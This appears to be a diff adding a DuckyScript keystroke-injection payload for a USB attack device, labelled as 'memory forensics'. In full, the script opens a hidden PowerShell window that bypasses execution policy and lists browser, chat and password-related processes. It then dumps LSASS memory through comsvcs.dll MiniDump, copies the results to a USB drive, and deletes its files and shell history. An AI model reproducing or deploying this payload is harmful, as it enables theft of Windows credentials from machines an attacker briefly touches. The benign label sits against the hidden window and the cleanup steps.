@@ -1,0 +1,64 @@
+# ============================================
+# PROCESS DUMP - Memory Forensics
+# ============================================
+# Purpose: Dump running processes for analysis
+# Target: Windows 10/11 (requires admin)
+# Time: 20 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+STRING $td = "$env:TEMP\.dump"; md $td -Force
+ENTER
+DELAY 200
+
+# List interesting processes
+STRING "=== RUNNING PROCESSES ===" | Out-File "$td\processes.txt"
+ENTER
+STRING Get-Process | Where-Object { $_.ProcessName -match "chrome|firefox|edge|outlook|teams|slack|discord|vpn|password" } | Select-Object ProcessName, Id, Path | Out-File "$td\processes.txt" -Append
+ENTER
+DELAY 500
+
+# Dump LSASS (requires admin)
+STRING "=== LSASS DUMP ===" | Out-File "$td\lsass.txt"
+ENTER
+STRING $lsass = Get-Process lsass -ErrorAction SilentlyContinue
+ENTER
+STRING if ($lsass) {
+ENTER
+STRING   rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass.Id "$td\lsass.dmp" full
+ENTER
+STRING   "LSASS dumped to lsass.dmp" | Out-File "$td\lsass.txt"
+ENTER
+STRING } else {
+ENTER
+STRING   "LSASS not accessible - need admin" | Out-File "$td\lsass.txt"
+ENTER
+STRING }
+ENTER
+DELAY 1000
+
+# Dump Chrome processes
+STRING "=== CHROME PROCESSES ===" | Out-File "$td\chrome.txt"
+ENTER
+STRING Get-Process chrome -ErrorAction SilentlyContinue | Select-Object Id, MainWindowTitle | Out-File "$td\chrome.txt" -Append
+ENTER
+DELAY 300
+
+# Copy to USB
+STRING if (Test-Path E:\) { md "E:\dump" -Force; Copy-Item "$td\*" "E:\dump\" -Force }
+ENTER
+DELAY 300
+
+# Clean
+STRING Remove-Item $td -Recurse -Force
+ENTER
+STRING Clear-History; exit
+ENTER
